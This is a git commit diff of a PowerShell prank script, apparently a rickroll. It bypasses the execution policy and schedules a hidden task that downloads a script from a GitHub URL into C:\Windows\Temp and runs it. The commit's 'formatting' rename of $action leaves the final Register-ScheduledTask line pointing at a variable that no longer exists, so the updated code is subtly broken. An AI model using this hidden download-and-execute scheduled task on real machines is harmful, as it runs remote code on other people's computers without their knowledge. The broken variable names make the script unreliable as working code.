99aaa79965c49cddde09296f1fe24c4ef75f7973
CyberSpooon <137320651+CyberSpooon@users.noreply.github.com>
2025-04-01 14:41:07 -0400

    Update scheduletherickoning.ps1
    formatting changes

--- scheduletherickoning.ps1
+++ scheduletherickoning.ps1
@@ -1,6 +1,6 @@
 Set-ExecutionPolicy -Scope CurrentUser Bypass
-$runTime = Get-Date "2025-04-01 10:30"
-$taskName = "GetRicked"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/GetRicked.ps1' -outfile 'C:\Windows\Temp\getricked.ps1'; & 'C:\Windows\Temp\getricked.ps1'"
+$runtime = Get-Date "2025-04-01 10:30"
+$taskname = "GetRicked"
+$task = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/GetRicked.ps1' -outfile 'C:\Windows\Temp\getricked.ps1'; & 'C:\Windows\Temp\getricked.ps1'"
 $trigger = New-ScheduledTaskTrigger -Once -At $runTime
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Get rickity rickity ricked son!"
